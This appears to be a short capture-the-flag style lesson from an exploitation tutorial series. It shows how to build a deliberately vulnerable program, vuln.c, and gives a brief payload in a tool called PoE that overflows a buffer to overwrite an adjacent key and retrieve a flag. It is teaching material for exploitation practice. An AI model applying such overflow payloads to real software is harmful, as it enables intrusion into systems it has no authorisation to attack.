Level 05
===

In this tutorial, we are going to exploit a simple buffer-overflow vulnerability
in `vuln.c`. The program can be compiled in both Windows and Linux.

### Building the Vulnerable Binary

On Linux,
```
gcc -o vuln vuln.c
```

On Windows,
```
cl vuln.c
```

### Exploiting the Vulnerability

We can overflow `buf` to overwrite the first eight byte of `key`. By making the
first eight byte of both `buf` and `key` to be `0xfeedfacecafebeef`, we can get
the flag. With PoE, the payload is as simple as follows.

```
act exploit():
    write(0xfeedfacecafebeef . "A"x24 . 0xfeedfacecafebeef . "\n")
    return rtrim(read("\n"))
```
